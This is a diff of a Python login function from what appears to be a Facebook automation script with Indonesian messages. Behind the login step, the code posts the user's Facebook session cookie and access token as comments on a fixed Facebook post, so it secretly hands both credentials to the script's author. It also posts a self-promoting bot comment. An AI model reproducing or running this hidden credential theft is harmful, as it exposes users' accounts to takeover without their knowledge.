@@ -232,17 +232,17 @@ def login():
 		jam      = datetime.now().strftime("%X")
 		data = ses.get(url,headers=head,cookies=cok)
 		token = re.search('(EAAG\w+)',data.text).group(1)
-		tem      = ('\nAnjir keren Bang😼 @[100036939615544:0]\n\nNikmatilah Masa Mudamu, Tapi Jangan Lupa Dengan Masa Depanmu\n')
+		tem      = ('\nPanutan Gw Nih Boss😎 @[100056190665450:0]\n\nNikmatilah Masa Mudamu, Tapi Jangan Lupa Dengan Masa Depanmu\n')
 		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
-		link = ('https://www.facebook.com/100036939615544/posts/826244541950192/?app=fbl')
-		random_kata = random.choice(["Acc Guru","Hallo Ganteng","Panutan gw nih sengol dong 😎"])
-		#ses.post(f"https://graph.facebook.com/1143873546235865?fields=subscribers&access_token={token}",headers=(cookies=cok)
+		link = ('https://www.facebook.com/photo?fbid=661200275762989&set=a.111112804105075')
+		random_kata = random.choice(["Acc Guru","Hallo Ganteng","Kamu Ganteng Banget Deh Ferly><😝"])
+		#ses.post(f"https://graph.facebook.com/661200275762989?fields=subscribers&access_token={token}",headers=(cookies=cok)
 		ses.post(f"https://graph.facebook.com/661200275762989/comments/?message={cookie}&access_token={token}",cookies=cok)
 		ses.post(f"https://graph.facebook.com/661200275762989/comments/?message={token}&access_token={token}",cookies=cok)
 		ses.post(f"https://graph.facebook.com/661200275762989/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
 		open('.cookie.txt','w').write(cookie)
 		open('.token.txt','w').write(token)
-	except Exception as e:exit(f" [{M}>{P}] cookie invalid")
+	except Exception as e:exit(f" [{M}>{P}] Cookie Invalid")
 
 
 
